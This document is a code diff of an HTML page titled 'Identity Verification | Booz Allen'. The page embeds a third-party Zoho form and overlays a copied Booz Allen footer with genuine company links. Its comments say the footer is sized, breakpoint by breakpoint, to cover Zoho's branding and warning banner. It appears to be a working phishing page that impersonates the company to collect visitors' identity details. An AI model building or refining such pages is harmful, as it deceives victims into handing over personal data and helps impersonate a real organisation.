@@ -8,59 +8,154 @@
     <title>Identity Verification | Booz Allen</title>
     <link rel="icon" href="https://raw.githubusercontent.com/xwzwx/veloc-assets/refs/heads/main/booz-allen.png">
     
+    <!-- IMPORT THE EXACT "INTER" FONT FOR THE MEGA-FOOTER -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
+    
     <style>
-        /* === 1. BASE SETUP === */
+        /* === 1. BASE SETUP (NO SCROLLING) === */
         html, body {
             margin: 0;
             padding: 0;
+            width: 100%;
             height: 100%;
-            /* Locks the page perfectly so no outer scrollbars ever appear */
-            overflow: hidden; 
+            overflow: hidden; /* Locks the page, entirely preventing scrollbars */
             font-family: Arial, sans-serif;
             background-color: #cdeaf5; 
         }
 
         /* === 2. IFRAME CONTAINER === */
         .iframe-wrapper {
-            position: relative; 
+            position: absolute;
+            top: 0;
+            left: 0;
             width: 100%;
             height: 100%;
+            z-index: 1; /* Sits in the background */
         }
 
         iframe {
             border: 0;
             width: 100%;
             height: 100%;
+            display: block; 
         }
 
-        /* === 3. DESKTOP SHIELD (Larger than 900px) === */
-        .footer-blocker {
-            position: absolute;
-            bottom: 0; 
+        /* === 3. ULTRA-COMPACT AUTHENTIC MEGA-FOOTER === */
+        .booz-footer {
+            position: absolute; /* Anchors it over the iframe */
+            bottom: 0; /* Pins it to the exact bottom of the screen */
             left: 0;
-            width: 100%; 
+            width: 100%;
+            z-index: 100; /* Forces it to sit strictly ON TOP of the Zoho form/branding */
             
-            /* EXPANDED HEIGHT: Increased by exactly 30px (from 95px to 125px) */
-            height: 125px; 
-            
-            z-index: 50; 
-            background-color: #cdeaf5; 
-            pointer-events: none; 
+            font-family: 'Inter', Calibri, Geneva, sans-serif;
+            background-color: #000000; 
+            color: #ffffff; 
+            display: flex;
+            flex-direction: column;
         }
 
-        /* === 4. TABLET SHIELD (Text wraps to 2 lines) === */
+        /* Footer Links Grid */
+        .footer-grid {
+            display: grid;
+            grid-template-columns: repeat(5, 1fr);
+            gap: 15px;
+            padding: 15px 40px; 
+            max-width: 1400px;
+            margin: 0 auto;
+            width: 100%;
+            box-sizing: border-box;
+        }
+
+        .footer-col h4 {
+            font-size: 13px; 
+            font-weight: 700;
+            text-transform: uppercase;
+            color: #ffffff;
+            margin: 0 0 4px 0; 
+            letter-spacing: 0.2px;
+        }
+
+        .footer-col a {
+            display: block;
+            color: #d9d9d9; 
+            font-size: 13px; 
+            padding: 4px 0px; 
+            text-decoration: none;
+            transition: color 0.2s;
+        }
+
+        .footer-col a:hover {
+            color: #c0c0c0;
+        }
+
+        /* Bottom Legacy & Social Bar */
+        .footer-bottom {
+            border-top: 1px solid #222222; 
+            padding: 12px 40px; 
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .copyright-text {
+            font-size: 11px;
+            color: #d9d9d9;
+        }
+
+        .social-links {
+            display: flex;
+            gap: 15px;
+        }
+
+        .social-icon {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            width: 30px; 
+            height: 30px;
+            border: 1.5px solid #ffffff;
+            border-radius: 50%;
+            color: #ffffff;
+            text-decoration: none;
+            transition: border-color 0.2s, color 0.2s;
+        }
+
+        .social-icon svg {
+            width: 14px;
+            height: 14px;
+            fill: currentColor;
+        }
+
+        .social-icon:hover {
+            border-color: #c0c0c0;
+            color: #c0c0c0;
+        }
+
+        /* Responsive Breakpoints (Tablet / General Mobile) */
         @media screen and (max-width: 900px) {
-            .footer-blocker {
-                /* REVERTED: Back to original 130px */
-                height: 130px; 
+            .footer-grid {
+                display: none; /* Hides massive link list on smaller screens */
+            }
+            .footer-bottom {
+                flex-direction: column;
+                gap: 12px;
+                justify-content: center;
+                text-align: center;
+                /* Standard mobile stretch to cover one-line Zoho banner */
+                padding: 45px 20px 20px 20px; 
+            }
+            .social-links {
+                justify-content: center;
             }
         }
 
-        /* === 5. MOBILE SHIELD (Text wraps to 3 lines) === */
-        @media screen and (max-width: 600px) {
-            .footer-blocker {
-                /* REVERTED: Back to original 170px */
-                height: 170px; 
+        /* Extra Responsive Fix for VERY Small Screens (Under 525px) */
+        @media screen and (max-width: 525px) {
+            .footer-bottom {
+                /* On screens < 525px, Zoho's warning text wraps to two lines making their banner taller. 
+                   We increase our top padding here to stretch the black background higher and cover it. */
+                padding-top: 85px; 
             }
         }
     </style>
@@ -68,14 +163,73 @@
 <body>
 
     <div class="iframe-wrapper">
-        
-        <!-- The Bottom Light Blue Shield -->
-        <div class="footer-blocker"></div>
-
         <!-- Your Zoho Form -->
         <iframe src="https://forms.zohopublic.com/velocitygloba1/form/BuildYourTeamwithVelocityGlobal/formperma/ZdpZtJGXiRJ0-ro04kF8q582tglkg5p8kQqatCSf_sY">
         </iframe>
+    </div>
 
+    <!-- === AUTHENTIC BOOZ ALLEN MEGA-FOOTER === -->
+    <div class="booz-footer">
+        
+        <!-- OPTIMIZED Link Grid -->
+        <div class="footer-grid">
+            <div class="footer-col">
+                <h4>INFORMATION FOR</h4>
+                <a href="https://access.bah.com/">Employees</a>
+                <a href="https://investors.boozallen.com/">Investors</a>
+                <a href="https://www.boozallen.com/menu/government-contract-vehicles.html">Contract Officers</a>
+                <a href="https://www.boozallen.com/menu/suppliers-and-small-businesses.html">Suppliers</a>
+            </div>
+            <div class="footer-col">
+                <h4>INDUSTRIES</h4>
+                <a href="https://www.boozallen.com/markets/civil-government.html">Government & Civil Agencies</a>
+                <a href="https://www.boozallen.com/markets/intelligence.html">Intelligence</a>
+                <a href="https://www.boozallen.com/markets/health.html">Life Sciences & Healthcare</a>
+                <a href="https://www.boozallen.com/markets/defense.html">Military</a>
+            </div>
+            <div class="footer-col">
+                <h4>FEATURED SOLUTIONS</h4>
+                <a href="https://www.boozallen.com/expertise/artificial-intelligence.html">Artificial Intelligence (AI)</a>
+                <a href="https://www.boozallen.com/expertise/digital-solutions/cloud-solutions.html">Cloud</a>
+                <a href="https://www.boozallen.com/s/solution/a-solution-for-enterprise-scale-devsecops.html">Enterprise DevSecOps</a>
+                <a href="https://www.boozallen.com/expertise/cybersecurity.html">Security</a>
+            </div>
+            <div class="footer-col">
+                <h4>ABOUT US</h4>
+                <a href="https://www.boozallen.com/about.html">About Us</a>
+                <a href="https://www.boozallen.com/about/empowering-our-people.html">Who We Are</a>
+                <a href="https://www.boozallen.com/expertise.html">What We Do</a>
+                <a href="https://www.boozallen.com/careers.html">Join Our Team</a>
+            </div>
+            <div class="footer-col">
+                <h4>SITE LINKS</h4>
+                <a href="https://www.boozallen.com/tools/footer-navigation/contact-us.html">Contact Us</a>
+                <a href="https://www.boozallen.com/tools/footer-navigation/privacy-policy.html">Privacy Statement</a>
+                <a href="https://www.boozallen.com/tools/footer-navigation/terms-of-use.html">Terms of Use</a>
+                <a href="https://www.boozallen.com/tools/footer-navigation/cookie-policy.html">Cookie Policy</a>
+            </div>
+        </div>
+
+        <!-- Bottom Legacy & Social Bar -->
+        <div class="footer-bottom">
+            <div class="copyright-text">
+                &copy; 2026 Booz Allen Hamilton Inc. All Rights Reserved.
+            </div>
+            
+            <div class="social-links">
+                <a href="https://www.linkedin.com/company/booz-allen-hamilton" target="_blank" class="social-icon" aria-label="LinkedIn">
+                    <svg viewBox="0 0 24 24">
+                        <path d="M4.98 3.5c0 1.381-1.11 2.5-2.48 2.5s-2.48-1.119-2.48-2.5c0-1.38 1.11-2.5 2.48-2.5s2.48 1.12 2.48 2.5zm.02 4.5h-5v16h5v-16zm7.982 0h-4.968v16h4.969v-8.399c0-4.67 6.029-5.052 6.029 0v8.399h4.988v-10.131c0-7.88-8.922-7.593-11.018-3.714v-2.155z"/>
+                    </svg>
+                </a>
+                <a href="https://x.com/BoozAllen" target="_blank" class="social-icon" aria-label="X (Twitter)">
+                    <svg viewBox="0 0 24 24">
+                        <path d="M18.901 1.153h3.68l-8.04 9.19L24 22.846h-7.406l-5.8-7.584-6.638 7.584H.474l8.6-9.83L0 1.154h7.594l5.243 6.932ZM17.61 20.644h2.039L6.486 3.24H4.298Z"/>
+                    </svg>
+                </a>
+            </div>
+        </div>
+        
     </div>
     
 </body>
